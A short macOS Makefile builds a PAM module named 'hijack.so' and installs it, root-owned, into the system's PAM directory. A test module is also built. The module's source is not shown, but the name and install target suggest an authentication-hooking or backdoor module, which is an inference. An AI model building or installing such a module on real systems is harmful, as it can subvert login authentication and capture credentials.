all: master
pam_test:
	cc -fPIC -c pam_test.c
	ld -arch x86_64 -macosx_version_min 10.5 -dylib -lpam -lc -o pam_test.so pam_test.o
master:
	cc -fPIC -c hijack.c
	ld -arch x86_64 -macosx_version_min 10.8 -dylib -lpam -lc -o hijack.so hijack.o
install:
	cp hijack.so /usr/lib/pam/
	chown root:wheel /usr/lib/pam/hijack.so
	chmod 0444 /usr/lib/pam/hijack.so
